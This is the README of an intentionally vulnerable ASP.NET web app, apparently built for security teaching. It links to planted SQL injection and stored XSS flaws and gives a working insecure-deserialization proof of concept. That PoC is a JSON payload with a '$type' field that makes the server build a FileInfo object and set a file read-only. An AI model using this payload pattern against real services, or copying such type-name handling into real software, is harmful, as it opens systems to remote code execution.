# VulnerableWebApp

This app currently contains two known vulnerabilities:

- [SQL injection](https://github.com/lboynton/VulnerableWebApp/blob/c9ad5c5759a54a1745289e16349f49d615fad48c/Controllers/Api/Posts.cs#L27)
- [Stored XSS](https://github.com/lboynton/VulnerableWebApp/blame/35336373287e4414865bb474899c35fbbcdedc0f/Views/Posts/Index.cshtml#L27)
- [Insecure Deserialization]()

# Insecure deserialization
Call the `POST /api/posts` endpoint with the following payloads.

## Exploit POC

First run `touch /tmp/rce-test.txt && chmod 777 /tmp/rce-test.txt`. Then send the following payload to the API:

```
{
    "input": {
        "$type":"System.IO.FileInfo, System.IO.FileSystem",
        "fileName":"/tmp/rce-test.txt",
        "IsReadOnly": true
    }
}
```

Then run `ls -l /tmp/rce-test.txt` and you should see that the file is now read-only.

## Valid data
```
{
    "input": {
        "Title":"testing"
    }
}
```
